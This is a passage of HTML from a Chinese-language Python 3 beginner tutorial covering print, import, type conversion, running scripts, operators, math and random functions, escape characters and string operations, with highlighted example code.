class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">if</span> expression : <br>   <span class="hljs-type">suite</span><br>elif expression : <br>   <span class="hljs-type">suite</span> <br><span class="hljs-keyword">else</span> : <br>   <span class="hljs-type">suite</span><br></code></pre></td></tr></table></figure><h3 id="print-输出"><a href="#print-输出" class="headerlink" title="print 输出"></a>print 输出</h3><p><strong>print</strong> 默认输出是换行的，如果要实现不换行需要在变量末尾加上 end&#x3D;””：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3</span><br> <br><span class="hljs-attribute">x</span>=<span class="hljs-string">&quot;a&quot;</span><br><span class="hljs-attribute">y</span>=<span class="hljs-string">&quot;b&quot;</span><br><span class="hljs-comment"># 换行输出</span><br><span class="hljs-built_in">print</span>( x )<br><span class="hljs-built_in">print</span>( y )<br> <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;---------&#x27;</span>)<br><span class="hljs-comment"># 不换行输出</span><br><span class="hljs-built_in">print</span>( x, <span class="hljs-attribute">end</span>=<span class="hljs-string">&quot; &quot;</span> )<br><span class="hljs-built_in">print</span>( y, <span class="hljs-attribute">end</span>=<span class="hljs-string">&quot; &quot;</span> )<br><span class="hljs-built_in">print</span>()<br></code></pre></td></tr></table></figure><h3 id="import-与-from…import"><a href="#import-与-from…import" class="headerlink" title="import 与 from…import"></a>import 与 from…import</h3><p>在 python 用 import 或者 from…import 来导入相应的模块。</p><p>将整个模块(somemodule)导入，格式为： import somemodule</p><p>从某个模块中导入某个函数,格式为： from somemodule import somefunction</p><p>从某个模块中导入多个函数,格式为： from somemodule import firstfunc, secondfunc, thirdfunc</p><p>将某个模块中的全部函数导入，格式为： from somemodule import *</p><h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><p>第一行注释标的是指向 python 的路径，告诉操作系统执行这个脚本的时候，调用 &#x2F;usr&#x2F;bin 下的 python 解释器。</p><p>此外还有以下形式（推荐写法）：</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs d"><span class="hljs-meta">#!/usr/bin/env python3</span><br></code></pre></td></tr></table></figure><h2 id="2-数据类型转换"><a href="#2-数据类型转换" class="headerlink" title="2.数据类型转换"></a>2.数据类型转换</h2><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>[int(x <a href="https://www.runoob.com/python3/python-func-int.html">,base])</a></td><td>将x转换为一个整数</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-float.html">float(x)</a></td><td>将x转换到一个浮点数</td></tr><tr><td>[complex(real <a href="https://www.runoob.com/python3/python-func-complex.html">,imag])</a></td><td>创建一个复数</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-str.html">str(x)</a></td><td>将对象 x 转换为字符串</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-repr.html">repr(x)</a></td><td>将对象 x 转换为表达式字符串</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-eval.html">eval(str)</a></td><td>用来计算在字符串中的有效Python表达式,并返回一个对象</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-tuple.html">tuple(s)</a></td><td>将序列 s 转换为一个元组</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-att-list-list.html">list(s)</a></td><td>将序列 s 转换为一个列表</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-set.html">set(s)</a></td><td>转换为可变集合</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-dict.html">dict(d)</a></td><td>创建一个字典。d 必须是一个 (key, value)元组序列。</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-frozenset.html">frozenset(s)</a></td><td>转换为不可变集合</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-chr.html">chr(x)</a></td><td>将一个整数转换为一个字符</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-ord.html">ord(x)</a></td><td>将一个字符转换为它的整数值</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-hex.html">hex(x)</a></td><td>将一个整数转换为一个十六进制字符串</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-oct.html">oct(x)</a></td><td>将一个整数转换为一个八进制字符串</td></tr></tbody></table><h2 id="3-解释器"><a href="#3-解释器" class="headerlink" title="3.解释器"></a>3.解释器</h2><p>Linux&#x2F;Unix的系统上，一般默认的 python 版本为 2.x，我们可以将 python3.x 安装在 <strong>&#x2F;usr&#x2F;local&#x2F;python3</strong> 目录中。</p><p>安装完成后，我们可以将路径 <strong>&#x2F;usr&#x2F;local&#x2F;python3&#x2F;bin</strong> 添加到您的 Linux&#x2F;Unix 操作系统的环境变量中，这样您就可以通过 shell 终端输入下面的命令来启动 Python3 。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span><span class="hljs-title class_">PATH</span>=<span class="hljs-variable">$PATH</span><span class="hljs-symbol">:/usr/local/python3/bin/python3</span>    <span class="hljs-comment"># 设置环境变量</span><br><span class="hljs-variable">$ </span>python3 --version<br><span class="hljs-title class_">Python</span> <span class="hljs-number">3.4</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="脚本式编程"><a href="#脚本式编程" class="headerlink" title="脚本式编程"></a>脚本式编程</h3><p>将如下代码拷贝至 <strong>hello.py</strong>文件中：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;Hello, Python!&quot;</span>);<br></code></pre></td></tr></table></figure><p>通过以下命令执行该脚本：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> hello.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure><p>输出结果为：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">Hello,</span> Python!<br></code></pre></td></tr></table></figure><p>在Linux&#x2F;Unix系统中，你可以在脚本顶部添加以下命令让Python脚本可以像SHELL脚本一样可直接执行：</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs d"><span class="hljs-meta">#! /usr/bin/env python3</span><br></code></pre></td></tr></table></figure><p>然后修改脚本权限，使其有执行权限，命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> +x hello.py</span><br></code></pre></td></tr></table></figure><p>执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./hello.py<br></code></pre></td></tr></table></figure><p>输出结果为：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">Hello,</span> Python!<br></code></pre></td></tr></table></figure><h2 id="4-运算符"><a href="#4-运算符" class="headerlink" title="4.运算符"></a>4.运算符</h2><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><p>以下假设变量 a&#x3D;10，变量 b&#x3D;21：</p><table><thead><tr><th>运算符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>+</td><td>加 - 两个对象相加</td><td>a + b 输出结果 31</td></tr><tr><td>-</td><td>减 - 得到负数或是一个数减去另一个数</td><td>a - b 输出结果 -11</td></tr><tr><td>*</td><td>乘 - 两个数相乘或是返回一个被重复若干次的字符串</td><td>a * b 输出结果 210</td></tr><tr><td>&#x2F;</td><td>除 - x 除以 y</td><td>b &#x2F; a 输出结果 2.1</td></tr><tr><td>%</td><td>取模 - 返回除法的余数</td><td>b % a 输出结果 1</td></tr><tr><td>**</td><td>幂 - 返回x的y次幂</td><td>a**b 为10的21次方</td></tr><tr><td>&#x2F;&#x2F;</td><td>取整除 - 向下取接近商的整数</td><td><code>&gt;&gt;&gt; 9//2 4 &gt;&gt;&gt; -9//2 -5</code></td></tr></tbody></table><h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><p>以下假设变量a为10，变量b为20：</p><table><thead><tr><th>运算符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>&#x3D;&#x3D;</td><td>等于 - 比较对象是否相等</td><td>(a &#x3D;&#x3D; b) 返回 False。</td></tr><tr><td>!&#x3D;</td><td>不等于 - 比较两个对象是否不相等</td><td>(a !&#x3D; b) 返回 True。</td></tr><tr><td>&gt;</td><td>大于 - 返回x是否大于y</td><td>(a &gt; b) 返回 False。</td></tr><tr><td>&lt;</td><td>小于 - 返回x是否小于y。所有比较运算符返回1表示真，返回0表示假。这分别与特殊的变量True和False等价。注意，这些变量名的大写。</td><td>(a &lt; b) 返回 True。</td></tr><tr><td>&gt;&#x3D;</td><td>大于等于 - 返回x是否大于等于y。</td><td>(a &gt;&#x3D; b) 返回 False。</td></tr><tr><td>&lt;&#x3D;</td><td>小于等于 - 返回x是否小于等于y。</td><td>(a &lt;&#x3D; b) 返回 True。</td></tr></tbody></table><h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><p>以下假设变量a为10，变量b为20：</p><table><thead><tr><th>运算符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>&#x3D;</td><td>简单的赋值运算符</td><td>c &#x3D; a + b 将 a + b 的运算结果赋值为 c</td></tr><tr><td>+&#x3D;</td><td>加法赋值运算符</td><td>c +&#x3D; a 等效于 c &#x3D; c + a</td></tr><tr><td>-&#x3D;</td><td>减法赋值运算符</td><td>c -&#x3D; a 等效于 c &#x3D; c - a</td></tr><tr><td>*&#x3D;</td><td>乘法赋值运算符</td><td>c *&#x3D; a 等效于 c &#x3D; c * a</td></tr><tr><td>&#x2F;&#x3D;</td><td>除法赋值运算符</td><td>c &#x2F;&#x3D; a 等效于 c &#x3D; c &#x2F; a</td></tr><tr><td>%&#x3D;</td><td>取模赋值运算符</td><td>c %&#x3D; a 等效于 c &#x3D; c % a</td></tr><tr><td>**&#x3D;</td><td>幂赋值运算符</td><td>c **&#x3D; a 等效于 c &#x3D; c ** a</td></tr><tr><td>&#x2F;&#x2F;&#x3D;</td><td>取整除赋值运算符</td><td>c &#x2F;&#x2F;&#x3D; a 等效于 c &#x3D; c &#x2F;&#x2F; a</td></tr><tr><td>:&#x3D;</td><td>海象运算符，可在表达式内部为变量赋值。<strong>Python3.8 版本新增运算符</strong>。</td><td>在这个示例中，赋值表达式可以避免调用 len() 两次: <code>if (n := len(a)) &gt; 10:    print(f&quot;List is too long (&#123;n&#125; elements, expected &lt;= 10)&quot;)</code></td></tr></tbody></table><h3 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h3><table><thead><tr><th>运算符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>&amp;</td><td>按位与运算符：参与运算的两个值,如果两个相应位都为1,则该位的结果为1,否则为0</td><td>(a &amp; b) 输出结果 12 ，二进制解释： 0000 1100</td></tr><tr><td>|</td><td>按位或运算符：只要对应的二个二进位有一个为1时，结果位就为1。</td><td>(a | b) 输出结果 61 ，二进制解释： 0011 1101</td></tr><tr><td>^</td><td>按位异或运算符：当两对应的二进位相异时，结果为1</td><td>(a ^ b) 输出结果 49 ，二进制解释： 0011 0001</td></tr><tr><td>~</td><td>按位取反运算符：对数据的每个二进制位取反,即把1变为0,把0变为1。~x 类似于 -x-1</td><td>(~a ) 输出结果 -61 ，二进制解释： 1100 0011， 在一个有符号二进制数的补码形式。</td></tr><tr><td>&lt;&lt;</td><td>左移动运算符：运算数的各二进位全部左移若干位，由”&lt;&lt;”右边的数指定移动的位数，高位丢弃，低位补0。</td><td>a &lt;&lt; 2 输出结果 240 ，二进制解释： 1111 0000</td></tr><tr><td>&gt;&gt;</td><td>右移动运算符：把”&gt;&gt;”左边的运算数的各二进位全部右移若干位，”&gt;&gt;”右边的数指定移动的位数</td><td>a &gt;&gt; 2 输出结果 15 ，二进制解释： 0000 1111</td></tr></tbody></table><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><table><thead><tr><th>运算符</th><th>逻辑表达式</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>and</td><td>x and y</td><td>布尔”与” - 如果 x 为 False，x and y 返回 x 的值，否则返回 y 的计算值。</td><td>(a and b) 返回 20。</td></tr><tr><td>or</td><td>x or y</td><td>布尔”或” - 如果 x 是 True，它返回 x 的值，否则它返回 y 的计算值。</td><td>(a or b) 返回 10。</td></tr><tr><td>not</td><td>not x</td><td>布尔”非” - 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。</td><td>not(a and b) 返回 False</td></tr></tbody></table><h3 id="逻辑运算符-1"><a href="#逻辑运算符-1" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p>Python语言支持逻辑运算符，以下假设变量 a 为 10, b为 20:</p><table><thead><tr><th>运算符</th><th>逻辑表达式</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>and</td><td>x and y</td><td>布尔”与” - 如果 x 为 False，x and y 返回 x 的值，否则返回 y 的计算值。</td><td>(a and b) 返回 20。</td></tr><tr><td>or</td><td>x or y</td><td>布尔”或” - 如果 x 是 True，它返回 x 的值，否则它返回 y 的计算值。</td><td>(a or b) 返回 10。</td></tr><tr><td>not</td><td>not x</td><td>布尔”非” - 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。</td><td>not(a and b) 返回 False</td></tr></tbody></table><h3 id="成员运算符"><a href="#成员运算符" class="headerlink" title="成员运算符"></a>成员运算符</h3><p>除了以上的一些运算符之外，Python还支持成员运算符，测试实例中包含了一系列的成员，包括字符串，列表或元组。</p><table><thead><tr><th>运算符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>in</td><td>如果在指定的序列中找到值返回 True，否则返回 False。</td><td>x 在 y 序列中 , 如果 x 在 y 序列中返回 True。</td></tr><tr><td>not in</td><td>如果在指定的序列中没有找到值返回 True，否则返回 False。</td><td>x 不在 y 序列中 , 如果 x 不在 y 序列中返回 True。</td></tr></tbody></table><h3 id="身份运算符"><a href="#身份运算符" class="headerlink" title="身份运算符"></a>身份运算符</h3><p>  身份运算符用于比较两个对象的存储单元</p><table><thead><tr><th>运算符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>is</td><td>is 是判断两个标识符是不是引用自一个对象</td><td><strong>x is y</strong>, 类似 <strong>id(x) &#x3D;&#x3D; id(y)</strong> , 如果引用的是同一个对象则返回 True，否则返回 False</td></tr><tr><td>is not</td><td>is not 是判断两个标识符是不是引用自不同对象</td><td><strong>x is not y</strong> ， 类似 **id(x) !&#x3D; id(y)**。如果引用的不是同一个对象则返回结果 True，否则返回 False。</td></tr></tbody></table><h3 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h3><p>以下表格列出了从最高到最低优先级的所有运算符：</p><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>**</td><td>指数 (最高优先级)</td></tr><tr><td>~ + -</td><td>按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@)</td></tr><tr><td>* &#x2F; % &#x2F;&#x2F;</td><td>乘，除，求余数和取整除</td></tr><tr><td>+ -</td><td>加法减法</td></tr><tr><td>&gt;&gt; &lt;&lt;</td><td>右移，左移运算符</td></tr><tr><td>&amp;</td><td>位 ‘AND’</td></tr><tr><td>^ |</td><td>位运算符</td></tr><tr><td>&lt;&#x3D; &lt; &gt; &gt;&#x3D;</td><td>比较运算符</td></tr><tr><td>&#x3D;&#x3D; !&#x3D;</td><td>等于运算符</td></tr><tr><td>&#x3D; %&#x3D; &#x2F;&#x3D; &#x2F;&#x2F;&#x3D; -&#x3D; +&#x3D; *&#x3D; **&#x3D;</td><td>赋值运算符</td></tr><tr><td>is is not</td><td>身份运算符</td></tr><tr><td>in not in</td><td>成员运算符</td></tr><tr><td>not and or</td><td>逻辑运算符</td></tr></tbody></table><h2 id="5-数字-Number"><a href="#5-数字-Number" class="headerlink" title="5.数字(Number)"></a>5.数字(Number)</h2><h3 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h3><table><thead><tr><th>函数</th><th>返回值 ( 描述 )</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/python3/python3-func-number-abs.html">abs(x)</a></td><td>返回数字的绝对值，如abs(-10) 返回 10</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-ceil.html">ceil(x) </a></td><td>返回数字的上入整数，如math.ceil(4.1) 返回 5</td></tr><tr><td>cmp(x, y)</td><td>如果 x &lt; y 返回 -1, 如果 x &#x3D;&#x3D; y 返回 0, 如果 x &gt; y 返回 1。 <strong>Python 3 已废弃，使用 (x&gt;y)-(x&lt;y) 替换</strong>。</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-exp.html">exp(x) </a></td><td>返回e的x次幂(ex),如math.exp(1) 返回2.718281828459045</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-fabs.html">fabs(x)</a></td><td>返回数字的绝对值，如math.fabs(-10) 返回10.0</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-floor.html">floor(x) </a></td><td>返回数字的下舍整数，如math.floor(4.9)返回 4</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-log.html">log(x) </a></td><td>如math.log(math.e)返回1.0,math.log(100,10)返回2.0</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-log10.html">log10(x) </a></td><td>返回以10为基数的x的对数，如math.log10(100)返回 2.0</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-max.html">max(x1, x2,…) </a></td><td>返回给定参数的最大值，参数可以为序列。</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-min.html">min(x1, x2,…) </a></td><td>返回给定参数的最小值，参数可以为序列。</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-modf.html">modf(x) </a></td><td>返回x的整数部分与小数部分，两部分的数值符号与x相同，整数部分以浮点型表示。</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-pow.html">pow(x, y)</a></td><td>x**y 运算后的值。</td></tr><tr><td>[round(x <a href="https://www.runoob.com/python3/python3-func-number-round.html">,n])</a></td><td>返回浮点数 x 的四舍五入值，如给出 n 值，则代表舍入到小数点后的位数。 <strong>其实准确的说是保留值将保留到离上一位更近的一端。</strong></td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-sqrt.html">sqrt(x) </a></td><td>返回数字x的平方根。</td></tr></tbody></table><hr><h3 id="随机数函数"><a href="#随机数函数" class="headerlink" title="随机数函数"></a>随机数函数</h3><p>随机数可以用于数学，游戏，安全等领域中，还经常被嵌入到算法中，用以提高算法效率，并提高程序的安全性。</p><p>Python包含以下常用随机数函数：</p><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/python3/python3-func-number-choice.html">choice(seq)</a></td><td>从序列的元素中随机挑选一个元素，比如random.choice(range(10))，从0到9中随机挑选一个整数。</td></tr><tr><td>[randrange (<a href="https://www.runoob.com/python3/python3-func-number-randrange.html">start,] stop [,step]) </a></td><td>从指定范围内，按指定基数递增的集合中获取一个随机数，基数默认值为 1</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-random.html">random() </a></td><td>随机生成下一个实数，它在[0,1)范围内。</td></tr><tr><td>[seed(<a href="https://www.runoob.com/python3/python3-func-number-seed.html">x]) </a></td><td>改变随机数生成器的种子seed。如果你不了解其原理，你不必特别去设定seed，Python会帮你选择seed。</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-shuffle.html">shuffle(lst) </a></td><td>将序列的所有元素随机排序</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-uniform.html">uniform(x, y)</a></td><td>随机生成下一个实数，它在[x,y]范围内。</td></tr></tbody></table><hr><h3 id="三角函数"><a href="#三角函数" class="headerlink" title="三角函数"></a>三角函数</h3><p>Python包括以下三角函数：</p><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/python3/python3-func-number-acos.html">acos(x)</a></td><td>返回x的反余弦弧度值。</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-asin.html">asin(x)</a></td><td>返回x的反正弦弧度值。</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-atan.html">atan(x)</a></td><td>返回x的反正切弧度值。</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-atan2.html">atan2(y, x)</a></td><td>返回给定的 X 及 Y 坐标值的反正切值。</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-cos.html">cos(x)</a></td><td>返回x的弧度的余弦值。</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-hypot.html">hypot(x, y)</a></td><td>返回欧几里德范数 sqrt(x<em>x + y</em>y)。</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-sin.html">sin(x)</a></td><td>返回的x弧度的正弦值。</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-tan.html">tan(x)</a></td><td>返回x弧度的正切值。</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-degrees.html">degrees(x)</a></td><td>将弧度转换为角度,如degrees(math.pi&#x2F;2) ，  返回90.0</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-radians.html">radians(x)</a></td><td>将角度转换为弧度</td></tr></tbody></table><hr><h3 id="数学常量"><a href="#数学常量" class="headerlink" title="数学常量"></a>数学常量</h3><table><thead><tr><th>常量</th><th>描述</th></tr></thead><tbody><tr><td>pi</td><td>数学常量 pi（圆周率，一般以π来表示）</td></tr><tr><td>e</td><td>数学常量 e，e即自然常数（自然常数）。</td></tr></tbody></table><h2 id="6-字符串"><a href="#6-字符串" class="headerlink" title="6.字符串"></a>6.字符串</h2><h3 id="访问字符串中的值"><a href="#访问字符串中的值" class="headerlink" title="访问字符串中的值"></a>访问字符串中的值</h3><p>Python 不支持单字符类型，单字符在 Python 中也是作为一个字符串使用。</p><p>Python 访问子字符串，可以使用方括号 [] 来截取字符串，字符串的截取的语法格式如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">变量<span class="hljs-selector-attr">[头下标:尾下标]</span><br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061638341.png" alt="img"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3</span><br> <br>var1 = <span class="hljs-string">&#x27;Hello World!&#x27;</span><br>var2 = <span class="hljs-string">&quot;Runoob&quot;</span><br> <br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;var1[0]: &quot;</span>, var1[0])<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;var2[1:5]: &quot;</span>, var2[1:5])<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">var1</span>[<span class="hljs-number">0</span>]:  H<br><span class="hljs-attribute">var2</span>[<span class="hljs-number">1</span>:<span class="hljs-number">5</span>]:  unoo<br></code></pre></td></tr></table></figure><h3 id="字符串更新"><a href="#字符串更新" class="headerlink" title="字符串更新"></a>字符串更新</h3><p>你可以截取字符串的一部分并与其他字段拼接，如下实例：</p><p>实例：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3</span><br> <br>var1 = <span class="hljs-string">&#x27;Hello World!&#x27;</span><br> <br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;已更新字符串 : &quot;</span>, var1[:6] + <span class="hljs-string">&#x27;Runoob!&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">已更新字符串 :  <span class="hljs-type">Hello</span> Runoob!<br></code></pre></td></tr></table></figure><h3 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h3><p>在需要在字符中使用特殊字符时，python 用反斜杠 \ 转义字符。如下表：</p><table><thead><tr><th>转义字符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>(在行尾时)</td><td>续行符</td><td><code>&gt;&gt;&gt; print(&quot;line1 \ ... line2 \ ... line3&quot;) line1 line2 line3 &gt;&gt;&gt; </code></td></tr><tr><td>\</td><td>反斜杠符号</td><td><code>&gt;&gt;&gt; print(&quot;\\&quot;) \</code></td></tr><tr><td>&#39;</td><td>单引号</td><td><code>&gt;&gt;&gt; print(&#39;\&#39;&#39;) &#39;</code></td></tr><tr><td>&quot;</td><td>双引号</td><td><code>&gt;&gt;&gt; print(&quot;\&quot;&quot;) &quot;</code></td></tr><tr><td>\a</td><td>响铃</td><td><code>&gt;&gt;&gt; print(&quot;\a&quot;)</code>执行后电脑有响声。</td></tr><tr><td>\b</td><td>退格(Backspace)</td><td><code>&gt;&gt;&gt; print(&quot;Hello \b World!&quot;) Hello World!</code></td></tr><tr><td>\000</td><td>空</td><td><code>&gt;&gt;&gt; print(&quot;\000&quot;) &gt;&gt;&gt; </code></td></tr><tr><td>\n</td><td>换行</td><td><code>&gt;&gt;&gt; print(&quot;\n&quot;)  &gt;&gt;&gt;</code></td></tr><tr><td>\v</td><td>纵向制表符</td><td><code>&gt;&gt;&gt; print(&quot;Hello \v World!&quot;) Hello        World! &gt;&gt;&gt;</code></td></tr><tr><td>\t</td><td>横向制表符</td><td><code>&gt;&gt;&gt; print(&quot;Hello \t World!&quot;) Hello    World! &gt;&gt;&gt;</code></td></tr><tr><td>\r</td><td>回车，将 \r 后面的内容移到字符串开头，并逐一替换开头部分的字符，直至将 \r 后面的内容完全替换完成。</td><td><code>&gt;&gt;&gt; print(&quot;Hello\rWorld!&quot;) World! &gt;&gt;&gt; print(&#39;google runoob taobao\r123456&#39;) 123456 runoob taobao</code></td></tr><tr><td>\f</td><td>换页</td><td><code>&gt;&gt;&gt; print(&quot;Hello \f World!&quot;) Hello        World! &gt;&gt;&gt; </code></td></tr><tr><td>\yyy</td><td>八进制数，y 代表 0~7 的字符，例如：\012 代表换行。</td><td><code>&gt;&gt;&gt; print(&quot;\110\145\154\154\157\40\127\157\162\154\144\41&quot;) Hello World!</code></td></tr><tr><td>\xyy</td><td>十六进制数，以 \x 开头，y 代表的字符，例如：\x0a 代表换行</td><td><code>&gt;&gt;&gt; print(&quot;\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21&quot;) Hello World!</code></td></tr><tr><td>\other</td><td>其它的字符以普通格式输出</td><td></td></tr></tbody></table><hr><h3 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h3><p>下表实例变量 a 值为字符串 “Hello”，b 变量值为 “Python”：</p><table><thead><tr><th>操作符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>+</td><td>字符串连接</td><td>a + b 输出结果： HelloPython</td></tr><tr><td>*</td><td>重复输出字符串</td><td>a*2 输出结果：HelloHello</td></tr><tr><td>[]</td><td>通过索引获取字符串中字符</td><td>a[1] 输出结果 <strong>e</strong></td></tr><tr><td>[ : ]</td><td>截取字符串中的一部分，遵循<strong>左闭右开</strong>原则，str[0:2] 是不包含第 3 个字符的。</td><td>a[1:4] 输出结果 <strong>ell</strong></td></tr><tr><td>in</td><td>成员运算符 - 如果字符串中包含给定的字符返回 True</td><td><strong>‘H’ in a</strong> 输出结果 True</td></tr><tr><td>not in</td><td>成员运算符 - 如果字符串中不包含给定的字符返回 True</td><td><strong>‘M’ not in a</strong> 输出结果 True</td></tr><tr><td>r&#x2F;R</td><td>原始字符串 - 原始字符串：所有的字符串都是直接按照字面的意思来使用，没有转义特殊或不能打印的字符。 原始字符串除在字符串的第一个引号前加上字母 r（可以大小写）以外，与普通字符串有着几乎完全相同的语法。</td><td><code>print( r&#39;\n&#39; ) print( R&#39;\n&#39; )</code></td></tr><tr><td>%</td><td>格式字符串</td><td>请看下一节内容。字符串格式化</td></tr></tbody></table><h3 id="字符串格式化"><a href="#字符串格式化" class="headerlink" title="字符串格式化"></a>字符串格式化</h3><p>python字符串格式化符号:</p><table><thead><tr><th>符  